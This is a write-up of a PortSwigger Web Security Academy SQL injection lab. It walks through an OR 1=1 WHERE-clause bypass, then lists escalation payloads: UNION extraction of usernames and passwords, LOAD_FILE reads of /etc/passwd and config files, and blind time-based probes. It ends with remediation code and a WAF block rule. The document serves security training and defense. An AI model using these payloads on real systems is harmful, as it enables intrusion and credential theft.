# SQL Injection Lab Report: WHERE Clause Boolean Bypass

**Lab:** SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
**Platform:** PortSwigger Web Security Academy
**Difficulty:** Apprentice
**URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
**Tool Used:** Burp Suite (HTTP interception and parameter modification)
**Result:** ✅ Lab Solved

---

## Lab Context

### Application Behavior (Before Attack)

The application displays products filtered by category. When a user selects "Accessories", the browser sends:

```http
GET /filter?category=Accessories HTTP/2
Host: [lab-instance].web-security-academy.net
```

The server executes:
```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

**Effect:** Only returns products where `released = 1` (published). Unreleased products with `released = 0` are silently hidden.

---

## Vulnerability Analysis

### Root Cause

The `category` parameter is concatenated directly into the SQL query string server-side. The database receives:

```sql
WHERE category = '[USER_INPUT_HERE]' AND released = 1
```

Because the input is not sanitized or parameterized, a single quote character `'` from the user is interpreted as SQL syntax, not data. This allows an attacker to break out of the string context and inject arbitrary SQL logic.

### Vulnerability Classification

| Property | Value |
|----------|-------|
| **Type** | SQL Injection |
| **Subtype** | Boolean-Based WHERE Clause Bypass |
| **CWE** | CWE-89: Improper Neutralization of Special Elements in SQL Command |
| **OWASP** | A03:2021 – Injection |
| **CVSS Base Score** | 9.8 (Critical) |
| **Attack Vector** | Network |
| **Authentication** | None required |

---

## Exploitation

### Step 1: Identify Injection Point

**Normal request intercepted in Burp Suite:**
```http
GET /filter?category=Accessories HTTP/2
Host: [target]
Cookie: session=[token]
```

**Observation:** `category` parameter is reflected in SQL query. Candidate for injection.

**Test:** Append single quote:
```
category=Accessories'
```
**Result:** Server error or unexpected behavior = injection confirmed.

---

### Step 2: Construct Payload

**Objective:** Make the WHERE clause always evaluate to TRUE to return all rows, bypassing the `AND released = 1` filter.

**Payload:**
```
Accessories'+OR+1=1--
```

**Component breakdown:**

```
Accessories  → Satisfies the opening category string
'            → Closes the developer's string literal
 OR 1=1      → Boolean tautology: always TRUE
--           → SQL comment: discards remaining query
```

---

### Step 3: Transmit via Burp Suite

**Modified request:**
```http
GET /filter?category=Accessories'+OR+1=1-- HTTP/2
Host: [target]
```

**URL-encoded form transmitted over the wire:**
```http
GET /filter?category=Accessories%27+OR+1%3D1-- HTTP/2
```

| Character | URL Encoding |
|-----------|-------------|
| `'` (single quote) | `%27` |
| `=` (equals) | `%3D` |

---

### Step 4: Server Executes Injected Query

**Injected query on server:**
```sql
SELECT * FROM products
WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

**Query logic evaluation:**

```
WHERE category = 'Accessories'    → Evaluates: TRUE (if in Accessories)
                                            OR FALSE (if other categories)
      OR 1=1                       → ALWAYS TRUE
```

Because `OR 1=1` is appended, the entire WHERE clause becomes:

```
(category = 'Accessories') OR (TRUE)
= TRUE for every single row in the table
```

And the `AND released = 1` restriction:
```
--' AND released = 1
↑
SQL comment: everything after -- is ignored
```

**Result:** Database returns all products from all categories, including those with `released = 0`.

---

## Output State

**Products returned after injection:**
- All previously visible released products
- Previously hidden unreleased products (with `released = 0`)

**Unreleased items identified:**
- Products with unusual placeholder images or missing price/purchase options were characteristic indicators of `released = 0` status in the lab environment

**Lab Confirmation:**
```
Banner displayed: "Congratulations, you solved the lab!"
```

---

## Escalation Potential (Beyond This Lab)

This lab demonstrates a basic WHERE clause bypass. In a real-world environment, the same injection point could be escalated:

### Data Extraction via UNION

```sql
-- Step 1: Determine number of columns
' ORDER BY 1--     → No error
' ORDER BY 2--     → No error
' ORDER BY 3--     → Error = table has 2 columns

-- Step 2: Find column data types
' UNION SELECT NULL, NULL--

-- Step 3: Extract credentials
' UNION SELECT username, password FROM users--
```

### File System Access (MySQL with FILE privilege)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'), NULL--
```

### Blind SQLi (When No Output Visible)

```sql
-- Time-based: If query takes >5 seconds, condition is true
' AND SLEEP(5)--

-- Boolean-based: Infer data character by character
' AND SUBSTRING(password,1,1)='a'--
```

---

## Remediation

### Fix 1: Parameterized Query (Mandatory)

```python
# Python - parameterized (correct)
cursor.execute(
    "SELECT * FROM products WHERE category = %s AND released = 1",
    (category,)
)

# The single quote in "Accessories' OR 1=1--" is now treated as
# a literal string value, not SQL syntax. The query becomes:
# WHERE category = "Accessories' OR 1=1--" AND released = 1
# Which returns 0 results (no product named that) - safe.
```

### Fix 2: Input Validation (Defense in Depth)

```python
import re

def validate_category(category):
    if not re.match(r'^[a-zA-Z0-9\s]{1,50}$', category):
        raise ValueError("Invalid category")
    return category
```

### Fix 3: WAF Rule

```
Block requests where category parameter contains:
- Single quote characters (')
- SQL keywords (OR, AND, UNION, SELECT)
- SQL comment sequences (--, /*, */)
```

---

## Proof of Concept Summary

| Phase | Action | Result |
|-------|--------|--------|
| **Reconnaissance** | Identify category filter parameter | GET /filter?category= confirmed |
| **Testing** | Append single quote to category | Server behavior changed = injectable |
| **Payload Craft** | `Accessories'+OR+1=1--` | Tautology bypasses released filter |
| **Execution** | Submit via Burp Suite | All products returned |
| **Confirmation** | Lab banner displayed | ✅ Solved |

---

## References

- PortSwigger SQL Injection Theory: https://portswigger.net/web-security/sql-injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- OWASP SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
